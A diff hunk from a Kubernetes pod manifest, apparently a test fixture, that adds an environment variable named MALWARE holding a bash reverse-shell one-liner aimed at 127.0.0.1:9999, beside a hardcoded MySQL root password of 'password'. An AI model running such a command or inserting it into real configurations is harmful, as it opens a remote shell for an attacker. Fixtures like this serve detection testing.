@@ -28,6 +28,8 @@ spec:
       env:
       - name: MYSQL_ROOT_PASSWORD
         value: password
+      - name: MALWARE
+        value: "bash -i >& /dev/tcp/127.0.0.1/9999 0>&1"
       - name: NO_PASSWORD
         valueFrom:
           resourceFieldRef:
